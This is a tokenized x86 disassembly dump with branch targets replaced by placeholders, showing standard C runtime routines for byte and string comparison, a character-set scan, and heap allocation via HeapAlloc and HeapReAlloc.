movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_420148
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_420210
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_420259
push 0xc
push r--data
call sub_40e30c
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_40d7cc
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rwxdata ] 0x3
jne r-xdata
call sub_40e351
retn
mov eax ebx
cmp [ rwxdata ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rwxdata ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_41090e
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_418924
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420355
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_413d20
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_420377
push 0x10
push r--data
call sub_40e30c
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_4107e9
pop ecx
jmp r-xdata
cmp [ rwxdata ] 0x3
jne r-xdata
push ebx
call sub_40fe78
pop ecx
jmp r-xdata
call sub_40e351
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_41090e
pop ecx
call sub_40d7cc
push 0x4
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_417ce5
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4204bb
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rwxdata ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rwxdata ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_4181e3
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_41090e
pop ecx
test eax eax
je r-xdata
cmp [ rwxdata ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_418924
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_40d7cc
call sub_40d7cc
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_41090e
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d78a
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_40d7cc
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_40d7cc
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_40f720
push ebx
call sub_417ce5
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_417d15
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d78a
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_40f720
push ebx
push [ ebp - 0x20 ]
call sub_417d15
add esp 0x14
mov eax esi
sub_420592
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
